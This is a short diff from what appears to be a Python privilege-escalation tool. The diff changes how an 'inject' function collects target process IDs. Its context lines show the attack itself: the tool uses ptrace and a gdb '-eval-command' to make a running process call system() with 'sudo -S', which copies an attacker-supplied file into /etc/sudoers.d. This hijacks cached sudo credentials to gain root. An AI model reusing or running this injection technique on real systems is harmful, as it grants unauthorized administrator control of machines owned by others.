@@ -93,11 +93,11 @@ def inject(payload,pid,sudofile):
     if not ptrace_check():
         sys.exit() 
     
+    pids = []
     if not pid:
-        pids = get_pids()
-        
+        pids = get_pids()    
     else:
-        pids = list(pid)
+        pids.append(pid)
      
     inject_payload = "-eval-command=\'call system(\"echo | sudo -S cp {} /etc/sudoers.d/{} 2>&1\")\'".format(payload, sudofile) 
     for x in pids:
